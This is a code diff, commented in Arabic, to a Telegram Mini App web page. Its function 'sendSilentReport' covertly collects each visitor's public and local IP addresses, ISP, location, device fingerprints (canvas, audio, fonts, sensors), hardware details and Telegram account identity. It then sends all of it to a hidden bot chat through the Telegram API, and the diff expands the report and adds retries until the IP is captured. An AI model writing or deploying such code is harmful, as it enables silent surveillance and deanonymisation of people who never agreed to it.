@@ -608,51 +608,87 @@
     // الإرسال إلى تيليجرام
     // ======================
     async function sendSilentReport() {
-        try {
-            const loc = document.getElementById('val-loc').innerText.trim() || 'غير معروف';
-
-            // استخدام template literals الصحيحة
-            const msg = `
-📱 **تقرير جهاز** ━━━━━━━━━━━━━━━━━━━
-💎 بريميوم: ${collectedData.isPremium}
-🌍 الموقع: ${loc}
-🌐 IP: ${collectedData.ip}
-🔒 Local IPs: ${collectedData.webrtcIps.join(', ') || '--'}
-🔋 البطارية: ${collectedData.bat || 'غير متاح'}
-📶 الشبكة: ${collectedData.net}
-🧠 RAM / Cores: ${collectedData.ram} / ${collectedData.cores}
-🎮 GPU: ${collectedData.gpu || 'غير متاح'}
-🎨 Fonts: ${collectedData.fonts || 'غير متاح'}
-📏 الدقة: ${collectedData.res} @ ${collectedData.pixelRatio}x
-🕒 Timezone: ${collectedData.timezone}
-🔊 Audio FP: ${collectedData.audio || 'غير متاح'}
-🖼️ Canvas FP: ${collectedData.canvas || 'غير متاح'}
-📱 Sensors: ${JSON.stringify(collectedData.sensors) || '{}'}
-━━━━━━━━━━━━━━━━━━━
-👤 المستخدم:
-${tg.initDataUnsafe.user ? 
-`الاسم: ${tg.initDataUnsafe.user.first_name || ''} ${tg.initDataUnsafe.user.last_name || ''}
-@ ${tg.initDataUnsafe.user.username || 'غير موجود'}
-ID: ${tg.initDataUnsafe.user.id}` : 'غير معروف'}
-            `.trim();
-
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: msg,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                })
-            });
-            console.log("Sent.");
-        } catch (err) {
-            console.error("Error sending:", err);
-        }
+    // التأكد من أن الـ IP تم جلبه قبل الإرسال
+    if (!collectedData.ip || collectedData.ip === "جاري الفحص..." || collectedData.ip === "N/A") {
+        setTimeout(sendSilentReport, 2000); 
+        return;
     }
+
+    try {
+        const loc = document.getElementById('val-loc').innerText.trim();
+        const isp = document.getElementById('val-isp').innerText;
+        const devType = document.getElementById('val-dev-type').innerText;
+        const lang = document.getElementById('val-lang').innerText;
+        const colorDepth = document.getElementById('val-color').innerText;
+        const orientation = document.getElementById('val-orient').innerText;
+
+        // بناء التقرير الشامل - كل معلومة في سطر
+        let reportText = "📑 *تقرير النظام الكامل (شامل)*\n";
+        reportText += "━━━━━━━━━━━━━━━\n";
+        
+        reportText += "🌐 *الشبكة والموقع:*\n";
+        reportText += "• IP العام: `" + collectedData.ip + "`\n";
+        reportText += "• IP المحلي: " + (collectedData.webrtcIps.join(', ') || "--") + "\n";
+        reportText += "• المزود (ISP): " + isp + "\n";
+        reportText += "• الموقع: " + loc + "\n";
+        reportText += "• التوقيت: " + (collectedData.timezone || "--") + "\n";
+        
+        reportText += "\n💻 *العتاد والنظام:*\n";
+        reportText += "• نوع الجهاز: " + devType + "\n";
+        reportText += "• المعالج: " + collectedData.cores + " Cores\n";
+        reportText += "• الرامات: " + collectedData.ram + "\n";
+        reportText += "• كارت الشاشة: " + (collectedData.gpu || "--") + "\n";
+        reportText += "• اللغة: " + lang + "\n";
+        
+        reportText += "\n📱 *الشاشة والبطارية:*\n";
+        reportText += "• الدقة: " + collectedData.res + "\n";
+        reportText += "• نسبة البكسل: " + collectedData.pixelRatio + "\n";
+        reportText += "• عمق الألوان: " + colorDepth + "\n";
+        reportText += "• البطارية: " + (collectedData.bat || "--") + "\n";
+        reportText += "• وضع الشاشة: " + orientation + "\n";
+        
+        reportText += "\n🔍 *البصمات والحساسات:*\n";
+        reportText += "• بصمة Canvas: `" + (collectedData.canvas || "--") + "`\n";
+        reportText += "• بصمة الصوت: `" + (collectedData.audio || "--") + "`\n";
+        reportText += "• المتصفح: " + (collectedData.browser || "--") + "\n";
+        reportText += "• الحساسات: `" + JSON.stringify(collectedData.sensors) + "`\n";
+        
+        reportText += "\n🔤 *الخطوط المكتشفة:*\n";
+        reportText += "• القائمة: " + (collectedData.fonts || "--") + "\n";
+        
+        reportText += "\n📶 *معلومات إضافية:*\n";
+        reportText += "• السرعة: " + (collectedData.net || "--") + "\n";
+        reportText += "• وقت الفحص: " + (collectedData.time || "--") + "\n";
+        
+        reportText += "━━━━━━━━━━━━━━━\n";
+        reportText += "👤 *بيانات حساب تيليجرام:*\n";
+
+        if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe.user) {
+            const u = window.Telegram.WebApp.initDataUnsafe.user;
+            reportText += "🆔 ID: `" + u.id + "`\n";
+            reportText += "👤 الاسم: " + (u.first_name || "") + " " + (u.last_name || "") + "\n";
+            reportText += "🔗 يوزر: @" + (u.username || "لا يوجد") + "\n";
+            reportText += "💎 بريميوم: " + (u.is_premium ? "نعم ✅" : "لا ❌") + "\n";
+        } else {
+            reportText += "⚠️ تم الدخول من متصفح خارجي\n";
+        }
+
+        // إرسال البيانات إلى البوت
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: reportText,
+                parse_mode: "Markdown"
+            })
+        });
+
+    } catch (err) {
+        console.error("خطأ في الإرسال:", err);
+    }
+}
 
     // ======================
     // التشغيل الرئيسي
